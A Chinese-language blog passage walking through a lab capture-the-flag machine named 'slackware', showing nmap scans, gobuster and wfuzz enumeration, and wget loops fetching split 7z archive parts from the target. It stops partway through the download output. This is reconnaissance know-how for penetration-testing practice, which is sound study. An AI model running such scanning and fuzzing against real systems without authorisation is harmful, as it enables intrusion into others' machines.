    <content type="html"><![CDATA[<p>cx 师傅今天太高产嘞，自愧不如呜呜呜（</p><span id="more"></span><h1 id="探寻存活主机"><a href="#探寻存活主机" class="headerlink" title="探寻存活主机"></a>探寻存活主机</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/home/kali/baji/slackware]<br>└─# nmap -Pn -n 192.168.56.0/24                        <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-12 01:10 EST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.1<br>Host is up (0.00044s latency).<br>Not shown: 996 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>135/tcp  open  msrpc<br>139/tcp  open  netbios-ssn<br>445/tcp  open  microsoft-ds<br>2179/tcp open  vmrdp<br>MAC Address: 0A:00:27:00:00:08 (Unknown)<br><br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.2<br>Host is up (0.00040s latency).<br>All 1000 scanned ports on 192.168.56.2 are <span class="hljs-keyword">in</span> ignored states.<br>Not shown: 1000 filtered tcp ports (proto-unreach)<br>MAC Address: 08:00:27:34:14:9C (Oracle VirtualBox virtual NIC)<br><br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.16<br>Host is up (0.00091s latency).<br>Not shown: 999 closed tcp ports (reset)<br>PORT  STATE SERVICE<br>1/tcp open  tcpmux<br>MAC Address: 08:00:27:18:04:1D (Oracle VirtualBox virtual NIC)<br><br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.4<br>Host is up (0.0000070s latency).<br>Not shown: 999 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br><br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 3.01 seconds<br></code></pre></td></tr></table></figure><p>锁定主机：192.168.56.16</p><h1 id="探寻目标主机服务"><a href="#探寻目标主机服务" class="headerlink" title="探寻目标主机服务"></a>探寻目标主机服务</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/home/kali/baji/slackware]<br>└─# nmap -Pn -n -sV -sC 192.168.56.16 -p-                                                                                                  <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-12 01:10 EST<br>Nmap scan report for 192.168.56.16<br>Host is up (0.00074s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT  STATE SERVICE VERSION<br>1/tcp open  ssh     OpenSSH 9.3 (protocol 2.0)<br>| ssh-hostkey: <br>|   256 e2:66:60:79:bc:d1:33:2e:c1:25:fa:99:e5:89:1e:d3 (ECDSA)<br>|_  256 98:59:c3:a8:2b:89:56:77:eb:72:4a:05:90:21:cb:40 (ED25519)<br>2/tcp open  http    Apache httpd 2.4.58 ((Unix))<br>|_http-title: Tribute to Slackware<br>| http-methods: <br>|_  Potentially risky methods: TRACE<br>|_http-server-header: Apache/2.4.58 (Unix)<br>MAC Address: 08:00:27:18:04:1D (Oracle VirtualBox virtual NIC)<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 37.39 seconds<br></code></pre></td></tr></table></figure><p>这次有点神奇哈哈哈,1端口为ssh，2端口为http</p><h1 id="对目标主机服务进行信息收集"><a href="#对目标主机服务进行信息收集" class="headerlink" title="对目标主机服务进行信息收集"></a>对目标主机服务进行信息收集</h1><h2 id="2-http"><a href="#2-http" class="headerlink" title="2-http"></a>2-http</h2><p><img src="https://img.dkdun.cn/v1/2024/12/fec5ec37919d5db1.png"></p><p>这个能够在谷歌搜到：salckware，在Security Advisories中最下面存在ssh key的泄露。</p><p><img src="https://img.dkdun.cn/v1/2024/12/23cf4cb7120d2e9b.png"></p><p><img src="https://img.dkdun.cn/v1/2024/12/b91efc085662e878.png"></p><p>下载到kali中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/home/kali/baji/slackware]<br>└─# curl https://www.slackware.com/infra/keys/GPG-KEY &gt; key<br>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current<br>                                 Dload  Upload   Total   Spent    Left  Speed<br>100  1572  100  1572    0     0    700      0  0:00:02  0:00:02 --:--:--   700<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2024/12/abb82f1889f30353.png"></p><p>留着备用，接下来继续信息收集。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/home/kali/baji/slackware]<br>└─# gobuster dir -u http://192.168.56.16:2 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,zip,bak,jpg,txt,html<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.56.16:2<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              php,zip,bak,jpg,txt,html<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster in directory enumeration mode<br>===============================================================<br>/.html                (Status: 403) [Size: 199]<br>/index.html           (Status: 200) [Size: 7511]<br>/background.jpg       (Status: 200) [Size: 13798]<br>/robots.txt           (Status: 200) [Size: 21]<br>/.html                (Status: 403) [Size: 199]<br>/getslack             (Status: 301) [Size: 240] [--&gt; http://192.168.56.16:2/getslack/]<br></code></pre></td></tr></table></figure><p>发现一个robots.txt。访问查看</p><p><img src="https://img.dkdun.cn/v1/2024/12/6beb7799ea7e9f90.png"></p><p>存在一个7z.001?</p><p>这是一个7z压缩文件的一个分卷，也就是说还有很多这样的分卷，且只是.00?不同</p><p>但是我得先找到这个分卷怎么下载。</p><p>去&#x2F;getslack看看<br><img src="https://img.dkdun.cn/v1/2024/12/a27a122c377a83a7.png"></p><p>提示在这里搜索？？？？</p><p>（在此之前我进行了对扫出的图片进行信息查看，继续扫描关于7z的信息与&#x2F;getslack目录下的文件这些都可以在未来提供一些有用的信息，只是这个靶机不需要，希望大家多多尝试。）<br>这是什么意思（这里我通过翻阅，发现一些压缩包分卷都会有一个前缀开头，所以我打算fuzz）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/home/kali/baji/slackware]<br>└─# wfuzz -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -u http://192.168.56.16:2/getslack/FUZZ.7z.001 --sc 200<br>********************************************************<br>* Wfuzz 3.1.0 - The Web Fuzzer                         *<br>********************************************************<br><br>Target: http://192.168.56.16:2/getslack/FUZZ.7z.001<br>Total requests: 207643<br><br>=====================================================================<br>ID           Response   Lines    Word       Chars       Payload                                                                                                                                 <br>=====================================================================<br><br>000000001:   200        1 L      2 W        12 Ch       &quot;# directory-list-lowercase-2.3-medium.txt&quot;                                                                                             <br>000000007:   200        1 L      2 W        12 Ch       &quot;# license, visit http://creativecommons.org/licenses/by-sa/3.0/&quot;                                                                       <br>000000003:   200        1 L      2 W        12 Ch       &quot;# Copyright 2007 James Fisher&quot;                                                                                                         <br>000000012:   200        1 L      2 W        12 Ch       &quot;# on atleast 2 different hosts&quot;                                                                                                        <br>000000009:   200        1 L      2 W        12 Ch       &quot;# Suite 300, San Francisco, California, 94105, USA.&quot;                                                                                   <br>000000010:   200        1 L      2 W        12 Ch       &quot;#&quot;                                                                                                                                     <br>000000011:   200        1 L      2 W        12 Ch       &quot;# Priority ordered case insensative list, where entries were found&quot;                                                                    <br>000000013:   200        1 L      2 W        12 Ch       &quot;#&quot;                                                                                                                                     <br>000000006:   200        1 L      2 W        12 Ch       &quot;# Attribution-Share Alike 3.0 License. To view a copy of this&quot;                                                                         <br>000000008:   200        1 L      2 W        12 Ch       &quot;# or send a letter to Creative Commons, 171 Second Street,&quot;                                                                            <br>000000005:   200        1 L      2 W        12 Ch       &quot;# This work is licensed under the Creative Commons&quot;                                                                                    <br>000000002:   200        1 L      2 W        12 Ch       &quot;#&quot;                                                                                                                                     <br>000000004:   200        1 L      2 W        12 Ch       &quot;#&quot;                                                                                                                                     <br>000049387:   200        80 L     794 W      19474 Ch    &quot;twitter&quot;      <br></code></pre></td></tr></table></figure><p>fuzz出来前缀是twitter。下载到本地看看。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/home/kali/baji/slackware]<br>└─# wget http://192.168.56.16:2/getslack/twitter.7z.001                                                                                    <br>--2024-11-12 01:28:00--  http://192.168.56.16:2/getslack/twitter.7z.001<br>Connecting to 192.168.56.16:2... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 20480 (20K) [application/x-7z-compressed]<br>Saving to: ‘twitter.7z.001’<br><br>twitter.7z.001                                     100%[=============================================================================================================&gt;]  20.00K  --.-KB/s    in 0.001s  <br><br>2024-11-12 01:28:00 (26.9 MB/s) - ‘twitter.7z.001’ saved [20480/20480]<br><br></code></pre></td></tr></table></figure><p>我们刚才说了，这只是7z的一个分卷，那么肯定还有很多。使用循环命令进行下载</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/home/kali/baji/slackware]<br>└─# for i in $(seq 1 20); do wget http://192.168.56.16:2/getslack/twitter.7z.0$i; done <br>--2024-11-12 01:29:31--  http://192.168.56.16:2/getslack/twitter.7z.01<br>Connecting to 192.168.56.16:2... connected.<br>HTTP request sent, awaiting response... 404 Not Found<br>2024-11-12 01:29:31 ERROR 404: Not Found.<br><br>--2024-11-12 01:29:31--  http://192.168.56.16:2/getslack/twitter.7z.02<br>Connecting to 192.168.56.16:2... connected.<br>HTTP request sent, awaiting response... 404 Not Found<br>2024-11-12 01:29:31 ERROR 404: Not Found.<br><br>--2024-11-12 01:29:31--  http://192.168.56.16:2/getslack/twitter.7z.03<br>Connecting to 192.168.56.16:2... connected.<br>HTTP request sent, awaiting response... 404 Not Found<br>2024-11-12 01:29:31 ERROR 404: Not Found.<br><br>--2024-11-12 01:29:31--  http://192.168.56.16:2/getslack/twitter.7z.04<br>Connecting to 192.168.56.16:2... connected.<br>HTTP request sent, awaiting response... 404 Not Found<br>2024-11-12 01:29:31 ERROR 404: Not Found.<br><br>--2024-11-12 01:29:31--  http://192.168.56.16:2/getslack/twitter.7z.05<br>Connecting to 192.168.56.16:2... connected.<br>HTTP request sent, awaiting response... 404 Not Found<br>2024-11-12 01:29:31 ERROR 404: Not Found.<br><br>--2024-11-12 01:29:31--  http://192.168.56.16:2/getslack/twitter.7z.06<br>Connecting to 192.168.56.16:2... connected.<br>HTTP request sent, awaiting response... 404 Not Found<br>2024-11-12 01:29:31 ERROR 404: Not Found.<br><br>--2024-11-12 01:29:31--  http://192.168.56.16:2/getslack/twitter.7z.07<br>Connecting to 192.168.56.16:2... connected.<br>HTTP request sent, awaiting response... 404 Not Found<br>2024-11-12 01:29:31 ERROR 404: Not Found.<br><br>--2024-11-12 01:29:31--  http://192.168.56.16:2/getslack/twitter.7z.08<br>Connecting to 192.168.56.16:2... connected.<br>HTTP request sent, awaiting response... 404 Not Found<br>2024-11-12 01:29:31 ERROR 404: Not Found.<br><br>--2024-11-12 01:29:31--  http://192.168.56.16:2/getslack/twitter.7z.09<br>Connecting to 192.168.56.16:2... connected.<br>HTTP request sent, awaiting response... 404 Not Found<br>2024-11-12 01:29:31 ERROR 404: Not Found.<br><br>--2024-11-12 01:29:31--  http://192.168.56.16:2/getslack/twitter.7z.010<br>Connecting to 192.168.56.16:2... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 20480 (20K) [application/x-7z-compressed]<br>Saving to: ‘twitter.7z.010’<br><br>twitter.7z.010                                     100%[=============================================================================================================&gt;]  20.00K  --.-KB/s    in 0.001s  <br><br>2024-11-12 01:29:31 (16.1 MB/s) - ‘twitter.7z.010’ saved [20480/20480]<br><br>--2024-11-12 01:29:31--  http://192.168.56.16:2/getslack/twitter.7z.011<br>Connecting to 192.168.56.16:2... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 20480 (20K) [application/x-7z-compressed]<br>Saving to: ‘twitter.7z.011’<br><br>twitter.7z.011                                     100%[=============================================================================================================&gt;]  20.00K  --.-KB/s    in 0.001s  <br><br>2024-11-12 01:29:31 (18.0 MB/s) - ‘twitter.7z.011’ saved [20480/20480]<br><br>--2024-11-12 01:29:31--  http://192.168.56.16:2/getslack/twitter.7z.012<br>Connecting to 192.168.56.16:2... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 20480 (20K) [application/x-7z-compressed]<br>Saving to: ‘twitter.7z.012’<br><br>twitter.7z.012                                     100%[=============================================================================================================&gt;]  20.00K  --.-KB/s    in 0s      <br><br>2024-11-12 01:29:31 (54.4 MB/s) - ‘twitter.7z.012’ saved [20480/20480]<br><br>--2024-11-12 01:29:31--  http://192.168.56.16:2/getslack/twitter.7z.013<br>Connecting to 192.168.56.16:2... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 20480 (20K) [application/x-7z-compressed]<br>Saving to: ‘twitter.7z.013’<br><br>twitter.7z.013                                     100%[=============================================================================================================&gt;]  20.00K  --.-KB/s    in 0.003s  <br><br>2024-11-12 01:29:31 (7.05 MB/s) - ‘twitter.7z.013’ saved [20480/20480]<br><br>--2024-11-12 01:29:31--  http://192.168.56.16:2/getslack/twitter.7z.014<br>Connecting to 192.168.56.16:2... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 1860 (1.8K) [application/x-7z-compressed]<br>Saving to: ‘twitter.7z.014’<br><br>twitter.7z.014                                     100%[=============================================================================================================&gt;]   1.82K  --.-KB/s    in 0s      <br><br>2024-11-12 01:29:31 (89.5 MB/s) - ‘twitter.7z.014’ saved [1860/1860]<br><br>--2024-11-12 01:29:31--  http://192.168.56.16:2/getslack/twitter.7z.015<br>Connecting to 192.168.56.16:2... connected.<br>HTTP request sent, awaiting response... 404 Not Found<br>2024-11-12 01:29:31 ERROR 404: Not Found.<br><br>--2024-11-12 01:29:31--  http://192.168.56.16:2/getslack/twitter.7z.016<br>Connecting to 192.168.56.16:2... connected.<br>HTTP request sent, awaiting response... 404 Not Found<br>2024-11-12 01:29:31 ERROR 404: Not Found.<br><br>--2024-11-12 01:29:31--  http://192.168.56.16:2/getslack/twitter.7z.017<br>Connecting to 192.168.56.16:2... connected.<br>HTTP request sent, awaiting response... 404 Not Found<br>2024-11-12 01:29:31 ERROR 404: Not Found.<br><br>--2024-11-12 01:29:31--  http://192.168.56.16:2/getslack/twitter.7z.018<br>Connecting to 192.168.56.16:2... connected.<br>HTTP request sent, awaiting response... 404 Not Found<br>2024-11-12 01:29:31 ERROR 404: Not Found.<br><br>--2024-11-12 01:29:31--  http://192.168.56.16:2/getslack/twitter.7z.019<br>Connecting to 192.168.56.16:2... connected.<br>HTTP request sent, awaiting response... 404 Not Found<br>2024-11-12 01:29:31 ERROR 404: Not Found.<br><br>--2024-11-12 01:29:31--  http://192.168.56.16:2/getslack/twitter.7z.020<br>Connecting to 192.168.56.16:2... connected.<br>HTTP request sent, awaiting response... 404 Not Found<br>2024-11-12 01:29:31 ERROR 404: Not Found.<br><br>                                                                                                                                                                                                         <br>┌──(root㉿kali)-[/home/kali/baji/slackware]<br>└─# for i in $(seq 1 20); do wget http://192.168.56.16:2/getslack/twitter.7z.00$i; done<br>--2024-11-12 01:29:35--  http://192.168.56.16:2/getslack/twitter.7z.001<br>Connecting to 192.168.56.16:2... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 20480 (20K) [application/x-7z-compressed]<br>Saving to: ‘twitter.7z.001.1’<br><br>twitter.7z.001.1                                   100%[=============================================================================================================&gt;]  20.00K  --.-KB/s    in 0.002s  <br><br>2024-11-12 01:29:35 (10.3 MB/s) - ‘twitter.7z.001.1’ saved [20480/20480]<br><br>--2024-11-12 01:29:35--  http://192.168.56.16:2/getslack/twitter.7z.002<br>Connecting to 192.168.56.16:2... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 20480 (20K) [application/x-7z-compressed]<br>Saving to: ‘twitter.7z.002’<br><br>twitter.7z.002                                     100%[=============================================================================================================&gt;]  20.00K  --.-KB/s    in 0.002s  <br><br>2024-11-12 01:29:35 (11.5 MB/s) - ‘twitter.7z.002’ saved [20480/20480]<br><br>--2024-11-12 01:29:35--  http://192.168.56.16:2/getslack/twitter.7z.003<br>Connecting to 192.168.56.16:2... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 20480 (20K) [application/x-7z-compressed]<br>Saving to: ‘twitter.7z.003’<br><br>twitter.7z.003                                     100%[=============================================================================================================&gt;]  20.00K  --.-KB/s    in 0.001s  <br><br>2024-11-12 01:29:35 (13.1 MB/s) - ‘twitter.7z.003’ saved [20480/20480]<br><br>--2024-11-12 01:29:35--  http://192.168.56.16:2/getslack/twitter.7z.004<br>Connecting to 192.168.56.16:2... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 20480 (20K) [application/x-7z-compressed]<br>Saving to: ‘twitter.7z.004’<br><br>twitter.7z.004                                     100%[=============================================================================================================&gt;]  20.00K  --.-KB/s    in 0s      <br><br>2024-11-12 01:29:35 (400 MB/s) - ‘twitter.7z.004’ saved [20480/20480]<br><br>--2024-11-12 01:29:35--  http://192.168.56.16:2/getslack/twitter.7z.005<br>Connecting to 192.168.56.16:2... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 20480 (20K) [application/x-7z-compressed]<br>Saving to: ‘twitter.7z.005’<br><br>twitter.7z.005                                     100%[=============================================================================================================&gt;]  20.00K  --.-KB/s    in 0.001s  <br><br>2024-11-12 01:29:35 (16.1 MB/s) - ‘twitter.7z.005’ saved [20480/20480]<br><br>--2024-11-12 01:29:35--  http://192.168.56.16:2/getslack/twitter.7z.006<br>Connecting to 192.168.56.16:2... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 20480 (20K) [application/x-7z-compressed]<br>Saving to: ‘twitter.7z.006’<br><br>twitter.7z.006                                     100%[=============================================================================================================&gt;]  20.00K  --.-KB/s    in 0.001s  <br><br>2024-11-12 01:29:35 (17.3 MB/s) - ‘twitter.7z.006’ saved [20480/20480]<br><br>--2024-11-12 01:29:35--  http://192.168.56.16:2/getslack/twitter.7z.007<br>Connecting to 192.168.56.16:2... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 20480 (20K) [application/x-7z-compressed]<br>Saving to: ‘twitter.7z.007’<br><br>twitter.7z.007                                     100%[=============================================================================================================&gt;]  20.00K  --.-KB/s    in 0.001s  <br><br>2024-11-12 01:29:35 (17.3 MB/s) - ‘twitter.7z.007’ saved [20480/20480]<br><br>--2024-11-12 01:29:35--  http://192.168.56.16:2/getslack/twitter.7z.008<br>Connecting to 192.168.56.16:2... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 20480 (20K) [application/x-7z-compressed]<br>Saving to: ‘twitter.7z.008’<br><br>twitter.7z.008                                     100%[=============================================================================================================&gt;]  20.00K  --.-KB/s    in 0.001s  <br><br>2024-11-12 01:29:35 (20.4 MB/s) - ‘twitter.7z.008’ saved [20480/20480]<br><br>--2024-11-12 01:29:35--  http://192.168.56.16:2/getslack/twitter.7z.009<br>Connecting to 192.168.56.16:2... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 20480 (20K) [application/x-7z-compressed]<br>Saving to: ‘twitter.7z.009’<br><br>twitter.7z.009                                     100%[=============================================================================================================&gt;]  20.00K  --.-KB/s    in 0s      <br><br>2024-11-12 01:29:35 (87.7 MB/s) - ‘twitter.7z.009’ saved [20480/20480]<br><br>--2024-11-12 01:29:35--  http://192.168.56.16:2/getslack/twitter.7z.0010<br>Connecting to 192.168.56.16:2... connected.<br>HTTP request sent, awaiting response... 404 Not Found<br>2024-11-12 01:29:35 ERROR 404: Not Found.<br><br>--2024-11-12 01:29:35--  http://192.168.56.16:2/getslack/twitter.7z.0011<br>Connecting to 192.168.56.16:2... connected.<br>HTTP request sent, awaiting response... 404 Not Found<br>2024-11-12 01:29:35 ERROR 404: Not Found.<br><br>--2024-11-12 01:29:35--  http://192.168.56.16:2/getslack/twitter.7z.0012<br>Connecting to 192.168.56.16:2... connected.<br>HTTP request sent, awaiting response... 404 Not Found<br>2024-11-12 01:29:35 ERROR 404: Not Found.<br><br>--2024-11-12 01:29:35--  http://192.168.56.16:2/getslack/twitter.7z.0013<br>Connecting to 192.168.56.16:2... connected.<br>HTTP request sent, awaiting response... 404 Not Found<br>2024-11-12 01:29:35 ERROR 404: Not Found.<br><br>--2024-11-12 01:29:35--  http://192.168.56.16:2/getslack/twitter.7z.0014<br>Connecting to 192.168.56.16:2... connected.<br>HTTP request sent, awaiting response... 404 Not Found<br>2024-11-12 01:29:35 ERROR 404: Not Found.<br><br>--2024-11-12 01:29:35--  